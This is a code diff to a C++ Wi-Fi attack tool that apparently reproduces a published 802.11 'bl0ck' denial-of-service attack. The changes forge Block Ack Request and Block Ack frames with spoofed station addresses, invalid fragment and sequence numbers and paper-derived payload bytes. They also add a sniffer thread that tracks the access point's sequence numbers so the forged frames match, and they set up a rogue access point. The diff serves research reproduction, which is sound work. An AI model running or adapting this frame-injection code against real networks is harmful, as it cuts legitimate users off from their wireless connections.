@@ -45,6 +45,7 @@ using json = nlohmann::json;
 RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const uint8_t fn, const uint16_t sn) {
 	//for some reason is dst first
 	Dot11BlockAckRequest bar(ap_mac, sta_mac); //  STA(attacker) -> AP
+	bar.bar_control(0x0004); // Compressed BAR, TID=0 (matches paper payload \x04\x00)
 	bar.fragment_number(fn);
 	bar.start_sequence(sn);
 
@@ -85,46 +86,21 @@ RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, 
 	return rt / bar / RawPDU(payload_data);
 }
 
-RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
-	Dot11BlockAck ba(ap_mac, sta_mac); // STA(attacker) -> AP
-	ba.fragment_number(4);			   // invalid FN
-	ba.start_sequence(1175);		   // random invalid SSN
-	ba.bar_control(0x0004);
-	const vector<uint8_t> payload_data = { 0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0x7f,
-		0x92,
-		0x08,
-		0x80 };
+RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const uint16_t fn, const uint16_t sn) {
+	Dot11BlockAck ba(ap_mac, sta_mac); // spoofed STA -> AP
+	ba.fragment_number(fn);  // intentionally non-zero
+	ba.start_sequence(sn);
+	ba.bar_control(0x0004); // Compressed BA, TID=0
+	const uint8_t bm[Dot11BlockAck::bitmap_size] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+	ba.bitmap(bm);
+	// extra padding matching paper listing 1.2 payload (same as BAR)
+	const vector<uint8_t> padding = {
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+		0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80 };
 	RadioTap rt{};
-	rt.tx_flags(0x28); // DONT_REORDER| NOACK
-	return rt / ba / RawPDU(payload_data);
+	rt.tx_flags(0x28);
+	return rt / ba / RawPDU(padding);
 }
 
 struct BARSContext {
@@ -134,15 +110,17 @@ struct BARSContext {
 	atomic<bool> stop{ false };
 };
 
+// dst_mac=STA: sniffs AP->STA QoS frames to get AP's current TX SN (paper BAR_SC.py: wlan dst STA)
 static void bars_sniffer_thread(
-	const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx, const int timeout_sec) {
-	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_mac.to_string();
+	const HWAddress<6> &dst_mac, const string &iface, BARSContext &ctx, const int timeout_sec) {
+	const string filter = "wlan type data subtype qos-data and wlan addr1 " + dst_mac.to_string();
 
 	components::poll_sniffer_pdu<monostate>(
-		[&](PDU &pdu) -> optional<monostate> {
+		[&](const PDU &pdu) -> optional<monostate> {
 			if(ctx.stop.load()) return monostate{};
 
-			const auto *qos = pdu.find_pdu<Dot11QoSData>();
+			// BPF guarantees qos-data subtype, so inner_pdu() is the Dot11QoSData directly
+			const auto *qos = dynamic_cast<const Dot11QoSData *>(pdu.inner_pdu());
 			if(!qos) return nullopt;
 
 			const uint16_t sn = (qos->seq_num() + 16) % 4096;
@@ -150,8 +128,8 @@ static void bars_sniffer_thread(
 			ctx.current_sn.store(sn);
 			ctx.current_fn.store(fn);
 			ctx.has_sn.store(true);
-			log(LogLevel::DEBUG, "BARS: Updated SSN={} FN={}", sn, fn);
-			return nullopt; // continue
+			log(LogLevel::DEBUG, "Sniffer: Updated SSN={} FN={}", sn, fn);
+			return nullopt;
 		},
 		iface,
 		filter,
@@ -187,7 +165,7 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string
 
 	BARSContext bars_ctx;
 
-	// ReSharper disable once CppTooWideScope // if in BARS if, join after emplace
+	// ReSharper disable once CppTooWideScope // if in BARS/BA if, join after emplace
 	optional<jthread> sniffer_thread;
 	if(attack_type == "BARS") {
 		sniffer_thread.emplace([&] { bars_sniffer_thread(sta_mac, iface, bars_ctx, duration_sec); });
@@ -267,7 +245,7 @@ void setup_attack(RunStatus &rs) {
 		rs.process_manager.wait_for("client2", "EVENT-CONNECTED", seconds(40)); //FIXME hardcoded timeout
 		if(rs.get_actor("client2")[SK::ip_addr]) ip::set_ip(rs, "client2");
 	}
-	components::setup_rogue_ap(rs);
+	components::setup_rogue_ap(rs, nullopt);
 }
 
 void run_bl0ck_attack(RunStatus &rs) {
